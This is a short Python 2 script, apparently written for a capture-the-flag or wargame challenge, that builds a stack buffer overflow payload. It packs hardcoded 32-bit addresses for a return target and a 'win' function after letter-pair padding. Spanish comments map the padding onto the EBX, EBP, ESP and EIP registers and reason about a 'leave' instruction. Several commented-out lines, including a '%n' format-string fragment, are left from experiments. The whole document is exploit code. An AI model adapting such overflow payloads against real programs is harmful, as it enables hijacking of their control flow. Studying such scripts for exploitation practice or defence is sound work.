import struct

TARGET=struct.pack("I",0x0804957c)#RETURN
WIN=struct.pack("I",0x080490b0)#OPEN
pad="A"*2
pad+="B"*2#14 para pad
pad+="C"*2#esto es ebx
pad+="D"*2
pad+="E"*2
pad+="F"*2
pad+="G"*2
pad+=WIN
#pad+="H"*2
#pad+="I"*2
#pad+="J"*2
#pad+="K"*2
pad+=WIN
#pad+=str(34516912)
#pad+="L"*2
#pad+="M"*2
#pad+=WIN*2
#pad+="N"*2
#pad+="O"*2
#pad+="P"*2
#pad+="Q"*2

#ebx en HHII ...esto se queda siempre
#EBP EN JJKK ..tambien
#ESP EN NNOOPPQQ
#EIP EN LLMM
#HAY UN LEAVE ME HACE PENSAR QUE SOLO HAY QUE MOVER EBP...
#NO PUEDES MOVER ESP NI EIP!
exp=""
exp+=pad#+WIN
#exp+="%n"*4
print exp
